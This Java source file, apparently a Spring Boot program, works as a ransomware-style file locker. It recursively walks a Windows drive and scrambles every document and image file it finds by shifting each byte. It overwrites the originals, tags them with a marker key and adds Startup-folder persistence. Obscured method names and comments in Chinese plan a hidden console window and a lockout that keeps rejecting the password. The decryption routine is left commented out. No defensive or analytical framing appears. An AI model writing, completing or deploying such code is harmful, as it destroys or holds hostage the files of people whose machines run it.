package com.test.test;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.util.Collection;

import org.apache.commons.io.FileUtils;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;

/**
 * Hello world!
 *
 */
@SpringBootApplication
public class App {
	public static void main(String[] args) {
		ConfigurableApplicationContext context = SpringApplication.run(App.class, args);
		System.out.println("Hello World!");
		File dir = new File("e:\\");
		String key="aaaaaa";
		
		//https://blog.csdn.net/dong945221578/article/details/78134725 不出现黑框启动
		//压缩包假面后会不能解压,"zip","rar"
		//把密码通过参数的形式传递进来
		//,"txt"会透露出密码
		//去掉web依赖，打包成jar行不行
		//添加密码重试功能，一直试，一直试 让密码一直错误 登录不进去
		ThreadPoolUtils threadPoolUtils=ThreadPoolUtils.initPools();
		Collection<File> listFiles = FileUtils.listFiles(dir, new String[]{"pdf","doc","docx","xls","xlsx","jpg","JPG","png","gif"}, true);

		for (File file : listFiles) {
			if (file.isFile()) {
				if(key.equals(readFileLastByte(file.getAbsolutePath(),key.length()))) {
					continue;
				}
				try {
					threadPoolUtils.execute(new Runnable() {
						public void run() {
							// TODO Auto-generated method stub
							try {
								//System.out.println(file.getAbsolutePath().indexOf("$RECYCLE.BIN"));
								if(file.getAbsolutePath().indexOf("$RECYCLE.BIN")!=-1) {
									return;
								}
								fggrtrtrtt(file.getAbsolutePath(), key);
							} catch (Exception e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
						}
					});
					
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					continue;
				}
			}
		}

//        for(File file:listFiles) {
//        	if(file.isFile()) {
//			if(!key.equals(readFileLastByte(file.getAbsolutePath(),key.length()))) {
//				continue;
//			}
//        	try {
//        		String[] names=file.getName().split("\\.");
//        		if(names.length!=2) {
//        			continue;
//        		}
//        		
//        		threadPoolUtils.execute(new Runnable() {
//					public void run() {
//						// TODO Auto-generated method stub
//						try {
//							//System.out.println(file.getAbsolutePath().indexOf("$RECYCLE.BIN"));
//							if(file.getAbsolutePath().indexOf("$RECYCLE.BIN")!=-1) {
//								return;
//							}
//							String name=file.getParentFile()+"\\" +names[0]+"解密"+"."+names[1];
//			        		xydejsdfer(file.getAbsolutePath(),name,key.length());
//						} catch (Exception e) {
//							// TODO Auto-generated catch block
//							e.printStackTrace();
//						}
//					}
//				});
//			} catch (Exception e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//				continue;
//			}
//        	}
//        }
        
		threadPoolUtils.shutdownLatch();
        System.exit(0);
	}
	
	

	public static void fggrtrtrtt(String fileUrl, String key) throws Exception {
		File file = new File(fileUrl);
		String path = file.getPath();
		if (!file.exists()) {
			return;
		}
		int index = path.lastIndexOf("\\");
		String destFile = path.substring(0, index) + "\\" + "abc";
		File dest = new File(destFile);
		InputStream in = new FileInputStream(fileUrl);
		OutputStream out = new FileOutputStream(destFile);
		byte[] buffer = new byte[1024];
		int r;
		byte[] buffer2 = new byte[1024];
		while ((r = in.read(buffer)) > 0) {
			for (int i = 0; i < r; i++) {
				byte b = buffer[i];
				buffer2[i] = b == 255 ? 0 : ++b;
			}
			out.write(buffer2, 0, r);
			out.flush();
		}
		in.close();
		out.close();
		file.delete();
		dest.renameTo(new File(fileUrl));
		appendMethodA(fileUrl, key);
		System.out.println("加密成功");
	}

	/**
	 *
	 * @param fileName
	 * @param content  密钥
	 */
	public static void appendMethodA(String fileName, String content) {
		try {
			// 打开一个随机访问文件流，按读写方式
			RandomAccessFile randomFile = new RandomAccessFile(fileName, "rw");
			// 文件长度，字节数
			long fileLength = randomFile.length();
			// 将写文件指针移到文件尾。
			randomFile.seek(fileLength);
			randomFile.writeBytes(content);
			randomFile.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}


	public static String xydejsdfer(String fileUrl, String tempUrl, int keyLength) throws Exception {
		System.out.println(tempUrl);
		File file = new File(fileUrl);
		if (!file.exists()) {
			return null;
		}
		File dest = new File(tempUrl);
		if (!dest.exists()) {
			dest.createNewFile();
		}
		if (!dest.getParentFile().exists()) {
			dest.getParentFile().mkdirs();
		}
		InputStream is = new FileInputStream(fileUrl);
		OutputStream out = new FileOutputStream(tempUrl);
		byte[] buffer = new byte[1024];
		byte[] buffer2 = new byte[1024];
		byte bMax = (byte) 255;
		long size = file.length() - keyLength;
		int mod = (int) (size % 1024);
		int div = (int) (size >> 10);
		int count = mod == 0 ? div : (div + 1);
		int k = 1, r;
		while ((k <= count && (r = is.read(buffer)) > 0)) {
			if (mod != 0 && k == count) {
				r = mod;
			}
			for (int i = 0; i < r; i++) {
				byte b = buffer[i];
				buffer2[i] = b == 0 ? bMax : --b;
			}
			out.write(buffer2, 0, r);
			k++;
		}
		out.close();
		is.close();
		//FileUtils.copyFile(dest, file);
		
		System.out.println(fileUrl+"解密密成功");
		return tempUrl;
	}

	/**
	 * 判断文件是否加密
	 * 
	 * @param fileName
	 * @return
	 */
	public static String readFileLastByte(String fileName, int keyLength) {
		File file = new File(fileName);
		if (!file.exists())
			return null;
		StringBuffer str = new StringBuffer();
		try {
			// 打开一个随机访问文件流，按读写方式
			RandomAccessFile randomFile = new RandomAccessFile(fileName, "r");
			// 文件长度，字节数
			long fileLength = randomFile.length();
			if(fileLength==0) {
				return null;
			}
			// 将写文件指针移到文件尾。
			for (int i = keyLength; i >= 1; i--) {
				randomFile.seek(fileLength - i);
				str.append((char) randomFile.read());
			}
			randomFile.close();
			return str.toString();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return null;
	}

	public boolean setAutoStart(boolean yesAutoStart, String lnk) {
		File f = new File(lnk);
		String p = f.getAbsolutePath();
		String startFolder = "";
		String osName = System.getProperty("os.name");
		String str = System.getProperty("user.home");
		if (osName.equals("Windows 7") || osName.equals("Windows 8") || osName.equals("Windows 10") || osName.equals("Windows Server 2012 R2") || osName.equals("Windows Server 2014 R2") || osName.equals("Windows Server 2016")) {
			startFolder = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
		}
		if (osName.endsWith("Windows XP")) {
			startFolder = System.getProperty("user.home") + "\\「开始」菜单\\程序\\启动";
		}
		if (setRunBySys(yesAutoStart, p, startFolder, lnk)) {
			return true;
		}
		return false;
	}

	// 设置是否随系统启动
	public boolean setRunBySys(boolean b, String path, String path2, String lnk) {
		File file = new File(path2 + "\\" + lnk);
		Runtime run = Runtime.getRuntime();
		File f = new File(lnk);

		// 复制
		try {
			if (b) {
				// 写入
				// 判断是否隐藏，注意用系统copy布置为何隐藏文件不生效
				if (f.isHidden()) {
					// 取消隐藏
					try {
						Runtime.getRuntime().exec("attrib -H \"" + path + "\"");
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				if (!file.exists()) {
					run.exec("cmd /c copy " + formatPath(path) + " " + formatPath(path2));
				}
				// 延迟0.5秒防止复制需要时间
				Thread.sleep(500);
			} else {
				// 删除
				if (file.exists()) {
					if (file.isHidden()) {
						// 取消隐藏
						try {
							Runtime.getRuntime().exec("attrib -H \"" + file.getAbsolutePath() + "\"");
						} catch (IOException e) {
							e.printStackTrace();
						}
						Thread.sleep(500);
					}
					run.exec("cmd /c del " + formatPath(file.getAbsolutePath()));
				}
			}
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}

	// 解决路径中空格问题
	private String formatPath(String path) {
		if (path == null) {
			return "";
		}
		return path.replaceAll(" ", "\" \"");
	}
}
